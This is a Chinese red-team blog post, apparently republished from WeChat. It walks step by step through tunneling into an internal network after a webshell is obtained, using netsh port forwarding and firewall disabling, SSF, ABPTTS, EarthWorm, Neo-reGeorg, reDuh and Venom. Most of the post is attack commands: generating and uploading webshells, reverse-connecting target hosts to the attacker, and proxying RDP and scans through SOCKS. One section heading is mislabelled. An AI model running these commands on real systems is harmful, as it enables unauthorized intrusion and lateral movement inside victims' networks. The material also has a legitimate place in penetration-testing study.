\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/CRJt4YYscdTDHKsW3NKcjA)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "WX20200923-211932@2x.png")

  

  

大家好，这里是 **渗透攻击红队** 的第 **15** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），每天一更

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

内网穿透

  

  

什么时候会用到内网穿透？

  

在我们拿下一个Webshell的时候，我们没办法把一些工具上传到目标服务器上去使用，那样可能会有风险，而且有的时候还没有特定的环境来使用工具。这个时候我们就可以使用内网穿透来吧服务器的流量代理到本地，就相当于我们是在内网环境，我们就可以使用自己PC上的工具对内网进行扫描，内网渗透，域渗透等等。

  

  

**内网穿透**

**netsh端口转发**

  

* * *

netsh（Networ Shell）是一个Windows系统本身提供的功能强大的网络配置命令行工具。使用netsh进行端口转发的条件是必须是管理员（administrator）权限。

  

* * *

  

一：查看防火墙配置

```
netsh firewall show config
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果操作模式（Operational mode）是启用的，那么我们操作的时候需要吧防火墙给关闭才可以进行接下来的操作。  
  

二、关闭防火墙

```
netsh advfirewall set allprofiles state off
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个时候防火墙（操作模式）就是关闭状态：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、添加一个入站规则（给外网打开一个端口）

 一般来说网络边界DMZ区都有一个内网网卡和一个外网网卡。这个时候我们就要吧它的外网0.0.0.0:3389端口打开。

```
`添加一个saul规则，走TCP协议，开一个10086端口``netsh advfirewall firewall add rule  dir=in action=allow protocol=TCP localport=10086``通过IPv4吧本地127.0.0.1的内网3389端口转发到外网的10086端口``netsh interface portproxy add v4tov4 listenport=10086 connectaddress=127.0.0.1 connectport=3389``查看防火墙状态``netsh firewall show state` `查看所有转发规则``netsh interface portproxy show all``-------------------------------------------------``删除规则``netsh advfirewall firewall delete rule  dir=in action=allow protocol=TCP localport=10086``netsh interface portproxy delete v4tov4 listenport=10086`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看转发规则中，地址是 \* 号说明任意地址都可以，如果是一个IP地址的话，那么说明只允许指定IP才可以连接。

这个时候我们只需要远程连接目标的10086端口就相当于连接了目标的3389端口：mstsc

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

额，连接错误不知道是为啥。(有知道的可以在读者讨论留言！)

但是我们可以使用这条命令：  

```
`netsh interface portproxy add v4tov4 listenport=10086 listenaddress=192.168.2.13 connectport=3389 connectaddress=192.168.2.13``listenaddress - 等待连接的本地IP地址。``listenport - 本地侦听TCP端口。``connectaddress - 将传入连接重定向到本地或远程IP地址（或DNS名称）。`
```

connectport - 一个TCP端口，来自listenport的连接会被转发到该端口。假设当前我们的RDP服务端口在一个非标准端口上进行响应，如10086（端口可以在服务设置中更改）。为此，我们需要将传入流量从TCP端口10086重定向到另一个本地端口 - 3389（即标准rdp端口）。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

使用mstsc进行远程连接：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

删除规则：

```
`删除指定的端口转发规则：``netsh interface portproxy delete v4tov4 listenport=10086 listenaddress=192.168.2.13``删除所有当前端口转发规则：``netsh interface portproxy reset`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

* * *

  

**SSF正反向代理**

  

### 反向代理

反向代理就是我们客户端监听，目标服务端连接我们的客户端。

PS：SSF走的是Socks5代理

```
SSF下载地址：https://securesocketfunneling.github.io/ssf/#download
```

一、服务端Win监听1111端口，等待连接：  

```
`Linux：``./ssfd -p 1111``Windows：``ssfd.exe -p 1111`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、客户端网络边界DMZ连接我们服务端的1111端口，并将数据流量转发给2222端口：

```
`Windows:``ssf.exe -F 2222 -p 1111 192.168.2.7``Linux:``./ssf -F 2222 -p 1111  192.168.2.7`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、使用代理工具Proxychains做socks代理

```
下载安装：apt install proxychains
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后设置配置文件：proxychains.conf

```
vi /etc/proxychains.conf
```

在最后一行改成 2222 端口保存退出：

```
socks5 127.0.0.1 2222
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后如果想用自己的工具或者说是kali自带的工具，那么就可以在前面加上proxychains就可以了：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 正向代理

如果目标防火墙只允许进不允许出，那么我们就可以使用正向代理。也就是我们去连接目标。

一、目标监听1080端口：

```
ssfd.exe -p 1080
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、服务端连接目标1080，并吧数据转发到1081：

```
.ssf -D 1081 -P 1080 192.168.2.4
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、使用Proxifier工具进行socks5代理连接：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

* * *

  

**abptts正向端口转发**

  

abptts是一款基于ssl加密的http隧道工具,相对来讲还算稳定。

PS：abptts不支持PHP

```
下载地址：https://github.com/nccgroup/ABPTTS.git
```

一、生成一个webshell  

```
 python abpttsfactory.py ‐o webshell
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

出错的话那么安装python的一些模块就好了：

```
`python ‐m pip install pycrypto``python ‐m pip install pycryptodome``python ‐m pip install httplib2`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
 python abpttsfactory.py ‐o webshell
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

生成之后当前路径下会有一个webshell目录，结构是这样的：

```
`webshell/``├── abptts.aspx``├── abptts.jsp``├── config.txt``├── GerbilFrame.war``└── war` `├── GerbilFrame.jsp` `├── META-INF` `│   └── MANIFEST.MF` `└── WEB-INF` `└── web.xml`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我本地使用的是Jspstudy，然后吧生成的脚本abptts.jsp上传上去：

访问：http://192.168.2.13/abptts.jsp 会得到一串加密值：

```
7d75922bf227ec32477d3bb1f15b6047423a6d23dd449fe61b15dab5d5467f72f9010247.571e91
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、使用python进行连接

```
 `命令格式：` `python abpttsclient.py ‐c webshell/config.txt ‐u "http://目标服务器/abptts.jsp" -f 本地内网IP：本地端口/目标边界内网IP:需要转发的目标边界端口` ` 将目标边界的3389转发到本地的33389端口上：` `python abpttsclient.py -c webshell/config.txt -u "http://192.168.2.13/abptts.jsp" -f 127.0.0.1:33389/127.0.0.1:3389`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后本地连接自己的127.0.0.1:33389就相当于连接192.168.2.13的3389端口：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

远程桌面rdp连接成功！

  

* * *

  

**earthworm正向跨平台socks代理**

  

### 反向代理 

一、客户端攻击机吧外网的888端口转发到本地的1008端口：

```
./ew_for_linux64 -s rcsocks -l 1008 -e 888
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、目标边界接收888端口的数据：

```
ew_for_Win.exe -s rssocks -d 192.168.2.13 -e 888
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

连接上攻击机服务端会显示rssocks cmd\_socket OK！  

这个时候修改 proxychains.conf 的端口为1008：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后如果想用自己的工具或者说是kali自带的工具，那么就可以在前面加上proxychains就可以了：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 正向代理 

目标边界执行：

```
ew_for_Win.exe -s ssocksd ‐l 1080
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

攻击机服务端修改proxychains文件：192.168.2.13是目标边界的IP

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后如果想用自己的工具或者说是kali自带的工具，那么就可以在前面加上proxychains就可以了：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

* * *

  

**earthworm正向跨平台socks代理**

  

```
下载地址：https://github.com/L-codes/Neo-reGeorg
```

一、生成webshell，密码是123456：  

```
python neoreg.py generate ‐k 123456
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

吧 neoreg\_servers文件夹下的tunnel.jsp 上传到目标服务器上：http://192.168.2.13/tunnel.php

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、攻击机客户端连接目标边界建立socks代理：

```
python neoreg.py -k 123456 -u http://192.168.2.13/tunnel.jsp
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个时候使用Proxifier进行socks5代理本地1080端口：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

* * *

  

**reDuh正向端口转发**

  

ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。

PS：这个工具卡的一笔！RDP连接随时会掉！

```
下载地址：https://github.com/sensepost/reDuh
```

一、吧服务端reDuh.jsp文件上传到目标服务器：http://192.168.2.13/reDuh.jsp  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、攻击机连接服务端：

在客户端的dist目录下执行：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`目录：reDuh\reDuhClient\dist``java ‐jar reduhclient.jar http://192.168.2.13/reDuh.jsp`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、绑定端口建立一个隧道

可以使用telnet或者nc等等：

```
telnet 127.0.0.1 1010
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

四、吧目标的3389端口转发到本地的33389

```
`命令语法： [createTunnel]要绑定到本地哪个端口上[33389]:127.0.0.1:要绑定远程机器上的哪个端口[3389,22]` `[createTunnel]33389:127.0.0.1:3389`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

五、连接本地的33389进行远程桌面登陆

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

* * *

  

**venom反向socks代理**

  

Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。

Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。

渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。

  

一、攻击机监听本地端口5555

```
admin.exe -lport 5555
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、目标边界反向连接我们服务端（192.168.2.13）

```
agent.exe ‐rhost 192.168.2.13 ‐rport 5555
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

连接成功服务端会显示success！

三、查看节点

```
show 
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

四：进入节点 1：

```
goto 1
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

五、进入交互式shell

```
shell
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

退出的话就使用：exit 命令：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

六、建立socks代理

```
socks 9999
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

七、最后使用Proxifier对公网192.168.2.13进行socks代理连接

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

* * *

  

渗透攻击红队 发起了一个读者讨论 快来发表你的评论吧 ！ 精选讨论内容

![](http://wx.qlogo.cn/mmhead/icFTnRoibgibpibVXBX5Fkia3ibSa8m6XsHT1wyDphrRkgMQEnKIv52xS4Yw/132)

ENDZHT

膜拜了，大佬

  

参考文章：

https://blog.csdn.net/qq\_18501087/article/details/89406614

https://www.freebuf.com/articles/system/176889.html

https://www.jianshu.com/p/baf750b09303

https://blog.csdn.net/jcfszxc/article/details/102966056

https://zhuanlan.zhihu.com/p/98526331

https://www.naraku.cn/posts/82.html

https://sensepost.com/research/reDuh/

https://blog.csdn.net/sudo0m/article/details/85198795

https://xz.aliyun.com/t/4058

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "qrcode_for_gh_c7af3a6c01f1_258.jpg")

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点分享

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点点赞

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点在看